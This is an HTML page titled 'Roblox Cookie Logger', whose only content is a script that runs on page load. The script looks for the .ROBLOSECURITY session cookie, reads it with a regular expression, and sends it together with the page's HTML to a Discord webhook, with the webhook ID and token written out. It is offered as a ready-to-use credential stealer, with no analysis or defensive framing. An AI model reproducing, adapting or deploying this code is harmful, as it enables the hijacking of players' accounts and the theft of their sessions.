<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Logger</title>
</head>
<body>

<!-- Include the script to extract Roblox cookie and send it to Discord -->
<script>
    // Function to extract Roblox cookie
    function extractRobloxCookie() {
        // Attempt to access the Roblox cookie
        var robloxCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);

        // If the cookie is found, send it to the designated Discord webhook along with the HTML content of the page
        if (robloxCookie) {
            var cookieValue = robloxCookie[1];
            var endpoint = 'https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx'; // Replace with your actual Discord webhook endpoint

            // Send the cookie value and HTML content to the endpoint
            fetch(endpoint, {
                method: 'POST',
                body: JSON.stringify({ 
                    robloxCookie: cookieValue,
                    htmlContent: document.documentElement.outerHTML // Include the HTML content of the page
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => {
                if (response.ok) {
                    console.log('Roblox cookie and HTML content sent successfully!');
                } else {
                    console.error('Failed to send Roblox cookie and HTML content:', response.status, response.statusText);
                }
            })
            .catch(error => {
                console.error('Error sending Roblox cookie and HTML content:', error.message);
            });
        }
    }

    // Call the function to extract and send the Roblox cookie and HTML content
    extractRobloxCookie();
</script>

</body>
</html>
